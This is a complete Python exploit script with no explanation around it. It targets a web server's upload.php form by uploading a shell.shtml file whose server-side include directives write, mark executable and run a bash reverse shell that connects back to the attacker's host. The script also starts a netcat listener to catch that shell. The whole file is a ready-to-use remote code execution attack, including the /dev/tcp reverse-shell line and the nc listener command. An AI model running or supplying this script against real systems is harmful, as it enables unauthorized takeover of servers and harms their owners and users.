import requests
import os
import threading
import time
RHOST=input("RHOST:")
RPORT=input("RPORT:")
LHOST=input("LHOST:")
LPORT=input("LPORT:")
def uploadshell():
    f=open("shell.shtml","w")
    f.write(f"<!--#exec cmd=\"echo 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' > /var/www/html/shell.sh\"-->")
    f.write("\n<!--#exec cmd=\"chmod +x /var/www/html/shell.sh\"-->")
    f.write("\n<!--#exec cmd=\"/bin/bash /var/www/html/shell.sh\"-->")
    f.close()
    request_file = {'file_upload':('shell.shtml',open('shell.shtml','rb'),'application/xhtml+xml',{})}
    r=requests.post(f"http://{RHOST}:{RPORT}/upload.php",files=request_file)
    r=requests.get(f"http://{RHOST}:{RPORT}/shell.shtml")
def hander():
    os.system(f"nc -lvp {LPORT}")

t=threading.Thread(target=hander)
t.start()

time.sleep(5)

t=threading.Thread(target=uploadshell)
t.start()

